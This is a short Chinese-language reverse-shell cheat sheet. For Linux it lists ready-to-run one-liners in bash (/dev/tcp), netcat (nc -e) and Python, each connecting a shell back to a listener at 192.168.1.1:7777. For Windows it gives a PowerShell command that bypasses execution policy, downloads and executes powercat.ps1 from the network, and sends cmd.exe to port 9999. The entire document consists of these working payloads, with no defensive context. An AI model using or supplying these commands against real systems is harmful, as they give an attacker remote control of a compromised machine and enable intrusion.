# 反弹shell

## Linux

等待反弹的shell会话主机：192.168.1.1:7777  
### bash
  
```
/bin/bash -i >& /dev/tcp/192.168.1.1/7777 0>&1     
```
### nc
```
nc -e /bin/bash 192.168.1.1 7777  
```
### python
新建python脚本执行     
或者通过python -c ''    
```
import os;os.system("bash -c 'bash -i >& /dev/tcp/192.168.1.1/7777 0>&1'")
```
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```


## Windows

### powercat
https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1    
```
powershell -nop -exec bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.1.1 -p 9999 -e cmd.exe"   
```
